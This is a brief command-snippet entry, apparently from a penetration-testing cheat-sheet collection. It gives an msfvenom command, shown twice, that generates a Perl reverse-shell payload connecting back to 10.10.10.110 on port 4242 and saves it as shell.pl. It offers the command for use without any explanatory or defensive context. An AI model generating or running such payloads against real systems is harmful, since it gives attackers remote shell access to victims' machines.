---
id: ba38765f-c254-4a69-b093-dcebfd27f01d
name: Generate Perl Reverse Shell
type: command
executor: bash
data: $ msfvenom -p cmd/unix/reverse_perl LHOST="10.10.10.110" LPORT=4242 -f raw >
  shell.pl
output: null
created_at: '2023-04-06T03:56:21.275773+00:00'
updated_at: '2023-04-10T20:25:02.586400+00:00'
---

# Generate Perl Reverse Shell

```bash
$ msfvenom -p cmd/unix/reverse_perl LHOST="10.10.10.110" LPORT=4242 -f raw > shell.pl
```
